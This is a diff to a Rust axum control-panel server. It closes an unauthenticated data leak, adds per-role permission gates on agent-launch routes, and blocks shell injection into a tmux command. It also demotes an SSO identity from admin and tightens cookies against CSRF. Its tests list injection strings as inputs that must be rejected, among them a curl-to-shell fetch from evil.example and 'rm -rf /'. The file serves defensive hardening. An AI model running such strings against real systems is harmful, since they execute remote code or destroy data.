@@ -23,11 +23,13 @@ pub async fn serve(port: u16) -> std::io::Result<()> {
         ([(axum::http::header::ACCESS_CONTROL_ALLOW_ORIGIN, "*")], axum::Json(status().await))
     }
     ensure_rbac_initialized();
-    // Public: SPA static files + read snapshot + auth ceremony + chat reads.
+    // Public: SPA static files + auth ceremony + the deliberately-scoped anonymous view-token routes.
+    // NOTE: `/control/status`, `/chat/*`, and the plain `/control/matrix/*` reads used to live here —
+    // that was an unauthenticated full-dashboard data leak (workdirs, task prompts, chat transcripts,
+    // live session ids). They now require the `read` permission; see the `reads` router below.
     let public = Router::new()
         .route("/", get(spa_root_route))
         .route("/{*path}", get(spa_static_route))
-        .route("/control/status", get(status_route))
         .route("/control/config", get(config_route))
         .route("/control/auth/status", get(auth_status_route))
         .route("/control/auth/register/begin", post(register_begin_route))
@@ -37,9 +39,7 @@ pub async fn serve(port: u16) -> std::io::Result<()> {
         .route("/control/invite/info", get(invite_info_route))
         .route("/control/public/matrix", get(public_matrix_route))
         .route("/control/public/matrix/live", get(public_matrix_live_route))
-        .route("/view/{token}", get(view_token_page_route))
-        .route("/chat/messages", get(chat_messages_route))
-        .route("/chat/incidents", get(chat_incidents_route));
+        .route("/view/{token}", get(view_token_page_route));
     // Admin sub-router (require_auth + require_admin both applied).
     let admin = Router::new()
         .route("/control/admin/users", get(admin_users_route))
@@ -56,9 +56,22 @@ pub async fn serve(port: u16) -> std::io::Result<()> {
         .route("/control/admin/view-tokens/create", post(admin_view_token_create_route))
         .route("/control/admin/view-tokens/{token}", delete(admin_view_token_revoke_route))
         .route_layer(axum::middleware::from_fn(require_admin));
-    // Protected by `require_auth` (own Face ID session OR busi SSO): every write action + the terminal WS.
-    let protected = Router::new()
+    // Read-only dashboard data — needs the `read` permission (every role has it by default).
+    let reads = Router::new()
+        .route("/control/status", get(status_route))
+        .route("/chat/messages", get(chat_messages_route))
+        .route("/chat/incidents", get(chat_incidents_route))
+        .route("/control/matrix/status", get(matrix_status_route))
+        .route("/control/matrix/log", get(matrix_log_route))
+        .route("/control/matrix/cell", get(matrix_cell_route))
+        .route("/control/matrix/live", get(matrix_live_route))
+        .route_layer(axum::middleware::from_fn(require_perm_read));
+    let chat = Router::new()
         .route("/chat/post", post(chat_post_route))
+        .route_layer(axum::middleware::from_fn(require_perm_chat));
+    // Everything that can launch/drive an agent, coder, or interactive shell — gated by `agents`
+    // (readonly/no-role users could previously reach these once merely authenticated).
+    let agents = Router::new()
         .route("/control/gateway/load", post(gateway_load_route))
         .route("/control/gateway/stop", post(gateway_stop_route))
         .route("/control/agent/launch", post(agent_launch_route))
@@ -70,18 +83,20 @@ pub async fn serve(port: u16) -> std::io::Result<()> {
         .route("/control/session/launch", post(session_launch_route))
         .route("/control/session/stop", post(session_stop_route))
         .route("/control/session/attach/{id}", get(session_attach_route))
-        .route("/control/project/add", post(project_add_route))
+        .route_layer(axum::middleware::from_fn(require_perm_agents));
+    let matrix = Router::new()
         .route("/control/matrix/run", post(matrix_run_route))
         .route("/control/matrix/pause", post(matrix_pause_route))
         .route("/control/matrix/resume", post(matrix_resume_route))
         .route("/control/matrix/stop", post(matrix_stop_route))
-        .merge(admin)
+        .route_layer(axum::middleware::from_fn(require_perm_matrix));
+    let projects = Router::new()
+        .route("/control/project/add", post(project_add_route))
+        .route_layer(axum::middleware::from_fn(require_perm_projects));
+    // Protected by `require_auth` (own Face ID session OR busi SSO), each sub-router additionally
+    // gated on its own permission above.
+    let protected = reads.merge(chat).merge(agents).merge(matrix).merge(projects).merge(admin)
         .route_layer(axum::middleware::from_fn(require_auth));
-    let public = public
-        .route("/control/matrix/status", get(matrix_status_route))
-        .route("/control/matrix/log", get(matrix_log_route))
-        .route("/control/matrix/cell", get(matrix_cell_route))
-        .route("/control/matrix/live", get(matrix_live_route));
     let app = public.merge(protected);
     let addr = format!("127.0.0.1:{port}");
     let listener = tokio::net::TcpListener::bind(&addr).await?;
@@ -417,6 +432,14 @@ fn spawn_participant(model: &str, room: &str, policy: &str, persona: &str, gw_po
 
 fn sanitize(s: &str) -> String {
     s.chars().map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' }).collect()
+}
+
+/// True if `s` cannot contain shell metacharacters — unlike `sanitize` (which mangles a string into a
+/// safe one), this REJECTS instead of mutating, for values that get interpolated into a shell-command
+/// string rather than passed as a plain argv element (`session_launch_route`'s tmux `inner` string).
+/// Permits the charset real model/agent identifiers use (HF-style `org/repo:tag`, dots, plus signs).
+fn shell_safe(s: &str) -> bool {
+    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '@' | '+'))
 }
 
 // ── Action route handlers ────────────────────────────────────────────────────────────────────────
@@ -845,6 +868,12 @@ async fn session_launch_route(axum::Json(req): axum::Json<SessionLaunchReq>) -> 
     let workdir = req.workdir.trim().to_string();
     if agent.is_empty() || model.is_empty() || workdir.is_empty() {
         return json_err(axum::http::StatusCode::BAD_REQUEST, "agent, model, workdir required");
+    }
+    // `agent`/`model` are interpolated into a shell-command string below (tmux `new-session`'s
+    // trailing argument) — reject anything outside a safe charset instead of shell-escaping, so no
+    // input can break out into arbitrary command execution.
+    if !shell_safe(&agent) || !shell_safe(&model) {
+        return json_err(axum::http::StatusCode::BAD_REQUEST, "agent/model contain unsupported characters");
     }
     if !std::path::Path::new(&workdir).is_dir() {
         return json_err(axum::http::StatusCode::BAD_REQUEST, "workdir is not a directory");
@@ -1760,7 +1789,13 @@ fn find_user_by_cred(cred_hex: &str) -> Option<UccUser> {
 }
 
 fn user_has_perm(user_id: &str, perm: &str) -> bool {
-    if user_id == "busi-sso" { return true; }
+    if user_id == "busi-sso" {
+        // busi pairing authenticates the owner's device driving the separate busi app — grant it the
+        // same permissions as the built-in "operator" role (read/chat/agents/matrix/projects), NOT
+        // admin. Previously this was an unconditional `return true`, silently handing full UCC admin
+        // (incl. user/role management) to any device merely paired with busi.
+        return matches!(perm, "read" | "chat" | "agents" | "matrix" | "projects");
+    }
     let users = load_users();
     let Some(user) = users.iter().find(|u| u.id == user_id) else { return false };
     let roles = load_roles();
@@ -1982,7 +2017,11 @@ fn rp_id() -> String {
     std::env::var("ROZUM_UCC_RP_ID").unwrap_or_else(|_| "busi.tail1174e2.ts.net".into())
 }
 fn rp_origin() -> String {
-    std::env::var("ROZUM_UCC_ORIGIN").unwrap_or_else(|_| "https://busi.tail1174e2.ts.net:8447".into())
+    // Stale default was `:8447`, left over from the old two-port (SPA + control-API) layout
+    // (docs/specs/unified-control-center.md). The SPA and API are now consolidated behind one
+    // Tailscale-serve port, `:8448` (see `deploy-ucc-web.sh`) — a WebAuthn ceremony validates the
+    // browser's actual origin against this, so a stale port here would reject every login/register.
+    std::env::var("ROZUM_UCC_ORIGIN").unwrap_or_else(|_| "https://busi.tail1174e2.ts.net:8448".into())
 }
 fn operator_uuid() -> Uuid { Uuid::from_u128(0x_524f_5a55_4d00_0000_0000_0000_0000_0001) }
 
@@ -2098,17 +2137,71 @@ async fn require_admin(
     req: axum::extract::Request,
     next: axum::middleware::Next,
 ) -> axum::response::Response {
+    require_perm(user_id, "admin", req, next).await
+}
+
+/// Shared body for the `require_perm_*` middlewares below: 403 unless the user (injected by
+/// `require_auth`) holds `perm` (or "admin", which satisfies every permission — see `user_has_perm`).
+async fn require_perm(user_id: String, perm: &str, req: axum::extract::Request, next: axum::middleware::Next) -> axum::response::Response {
     use axum::response::IntoResponse;
-    if user_has_perm(&user_id, "admin") {
+    if user_has_perm(&user_id, perm) {
         next.run(req).await
     } else {
-        (axum::http::StatusCode::FORBIDDEN, axum::Json(serde_json::json!({ "error": "admin required" }))).into_response()
+        (axum::http::StatusCode::FORBIDDEN, axum::Json(serde_json::json!({ "error": format!("{perm} permission required") }))).into_response()
     }
 }
 
+/// Gates the dashboard/chat/matrix READ routes that used to be fully public (data-leak fix): status,
+/// chat history, and the non-token matrix status/log/cell/live views. The admin-issued view-token
+/// routes (`/control/public/matrix*`, `/view/{token}`) remain separately, deliberately, public.
+async fn require_perm_read(
+    axum::extract::Extension(user_id): axum::extract::Extension<String>,
+    req: axum::extract::Request,
+    next: axum::middleware::Next,
+) -> axum::response::Response {
+    require_perm(user_id, "read", req, next).await
+}
+
+async fn require_perm_chat(
+    axum::extract::Extension(user_id): axum::extract::Extension<String>,
+    req: axum::extract::Request,
+    next: axum::middleware::Next,
+) -> axum::response::Response {
+    require_perm(user_id, "chat", req, next).await
+}
+
+/// Gates agent/coder/session/gateway launch+control — the routes that can run arbitrary commands or
+/// attach a live shell. Previously reachable by ANY authenticated session regardless of role.
+async fn require_perm_agents(
+    axum::extract::Extension(user_id): axum::extract::Extension<String>,
+    req: axum::extract::Request,
+    next: axum::middleware::Next,
+) -> axum::response::Response {
+    require_perm(user_id, "agents", req, next).await
+}
+
+async fn require_perm_matrix(
+    axum::extract::Extension(user_id): axum::extract::Extension<String>,
+    req: axum::extract::Request,
+    next: axum::middleware::Next,
+) -> axum::response::Response {
+    require_perm(user_id, "matrix", req, next).await
+}
+
+async fn require_perm_projects(
+    axum::extract::Extension(user_id): axum::extract::Extension<String>,
+    req: axum::extract::Request,
+    next: axum::middleware::Next,
+) -> axum::response::Response {
+    require_perm(user_id, "projects", req, next).await
+}
+
 fn set_cookie(name: &str, value: &str, max_age: u64) -> [(axum::http::HeaderName, String); 1] {
+    // SPA + API are same-origin (see `serve`'s doc comment) — SameSite=Lax is enough for normal
+    // top-level use and, unlike `None`, stops the cookie riding along on a cross-site POST/fetch
+    // (CSRF against `coder_stop_route`/`session_stop_route`, which accept any Content-Type).
     [(axum::http::header::SET_COOKIE,
-      format!("{name}={value}; Path=/; Max-Age={max_age}; Secure; HttpOnly; SameSite=None"))]
+      format!("{name}={value}; Path=/; Max-Age={max_age}; Secure; HttpOnly; SameSite=Lax"))]
 }
 
 async fn auth_status_route(headers: axum::http::HeaderMap) -> axum::response::Response {
@@ -2116,7 +2209,9 @@ async fn auth_status_route(headers: axum::http::HeaderMap) -> axum::response::Re
     let user_id = authed_user_id(&headers);
     let user_info = user_id.as_deref().and_then(|uid| {
         if uid == "busi-sso" {
-            return Some(serde_json::json!({ "id": "busi-sso", "display_name": "busi SSO", "permissions": ["admin"] }));
+            // Keep in sync with the `busi-sso` branch of `user_has_perm` — operator-level, not admin.
+            return Some(serde_json::json!({ "id": "busi-sso", "display_name": "busi SSO",
+                "permissions": ["read", "chat", "agents", "matrix", "projects"] }));
         }
         let users = load_users();
         let user = users.iter().find(|u| u.id == uid)?;
@@ -2558,5 +2653,38 @@ mod tests {
         assert!(json.contains("\"installed\""));
         // residents in the ledger each have a non-empty model name.
         assert!(s.residency.residents.iter().all(|r| !r.model.is_empty()));
+    }
+
+    #[test]
+    fn shell_safe_accepts_realistic_model_and_agent_names() {
+        assert!(shell_safe("claude"));
+        assert!(shell_safe("codex"));
+        assert!(shell_safe("mlx-community/Qwen2.5-Coder-7B-Instruct-4bit"));
+        assert!(shell_safe("org/repo:tag+build"));
+    }
+
+    #[test]
+    fn shell_safe_rejects_shell_metacharacters() {
+        // These are exactly the shapes that would break out of the tmux `new-session` shell-command
+        // string built in `session_launch_route` (see ucc-session-launch-injection).
+        assert!(!shell_safe("codex; curl evil.example | sh"));
+        assert!(!shell_safe("codex `id`"));
+        assert!(!shell_safe("codex $(id)"));
+        assert!(!shell_safe("codex && rm -rf /"));
+        assert!(!shell_safe("codex\nrm -rf /"));
+        assert!(!shell_safe("has space"));
+        assert!(!shell_safe(""));
+    }
+
+    #[test]
+    fn busi_sso_gets_operator_perms_not_admin() {
+        // Regression guard for ucc-busi-sso-scope: busi pairing must NOT satisfy the "admin"
+        // permission (previously `user_has_perm` returned true unconditionally for busi-sso).
+        assert!(user_has_perm("busi-sso", "read"));
+        assert!(user_has_perm("busi-sso", "chat"));
+        assert!(user_has_perm("busi-sso", "agents"));
+        assert!(user_has_perm("busi-sso", "matrix"));
+        assert!(user_has_perm("busi-sso", "projects"));
+        assert!(!user_has_perm("busi-sso", "admin"));
     }
 }
